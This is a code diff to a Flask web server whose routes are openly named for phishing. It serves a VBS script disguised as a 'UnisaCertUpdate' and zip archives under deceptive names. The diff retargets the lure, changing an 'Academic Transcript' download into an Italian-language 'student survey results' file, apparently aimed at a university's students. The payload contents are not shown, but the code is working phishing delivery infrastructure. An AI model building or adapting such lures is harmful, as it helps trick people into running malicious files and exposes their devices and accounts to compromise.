@@ -248,8 +248,8 @@ def serve_launcher():
         headers={'Content-Disposition': 'attachment; filename="UnisaCertUpdate.vbs"'}
     )
     
+@app.route('/sondaggio', methods=['GET'])
 @app.route('/transcript', methods=['GET'])
-@app.route('/academic', methods=['GET'])
 def phishing_xlsm():
     html_path = Path(__file__).parent / 'phishing' / 'index.html'
     if not html_path.exists():
@@ -258,11 +258,11 @@ def phishing_xlsm():
 
 @app.route('/download', methods=['GET'])
 def phishing_zip():
-    zip_path = Path(__file__).parent / 'phishing' / 'Academic_Transcript.zip'
+    zip_path = Path(__file__).parent / 'phishing' / 'Risultati_Sondaggio_Studenti.zip'
     if not zip_path.exists():
         return "Not found", 404
     return send_file(str(zip_path), as_attachment=True,
-                     download_name='Academic_Transcript.zip',
+                     download_name='Risultati_Sondaggio_Studenti.zip',
                      mimetype='application/zip')
 
 @app.route('/comunicazione', methods=['GET'])
